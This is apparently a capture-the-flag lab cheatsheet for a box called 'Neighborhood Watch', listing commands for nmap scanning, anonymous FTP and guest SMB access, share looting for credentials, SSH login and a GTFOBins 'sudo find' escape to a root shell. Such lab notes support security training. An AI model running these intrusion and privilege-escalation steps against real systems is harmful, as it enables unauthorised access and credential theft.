# Cheatsheet — Neighborhood Watch

## Targets

- **gatekeeper01** — ftp + smb + ssh; one flag per skill stage

## Useful commands

```bash
nmap -sV -sC <ip>
ftp <ip>                       # anonymous / anonymous
smbclient -N -L //<ip>         # list guest shares
smbclient -N //<ip>/it         # pull the share
smbmap -H <ip> -u guest
ssh fieldtech@<ip>
sudo -l
sudo find . -exec /bin/sh \; -quit   # GTFOBins find → root
```

## Concepts

- Anonymous access is a finding, not a dead end — pull *everything*
- Shares leak the human layer: creds, hostnames, procedures
- `sudo <gtfobin>` is the cheapest privesc there is — always check `sudo -l`
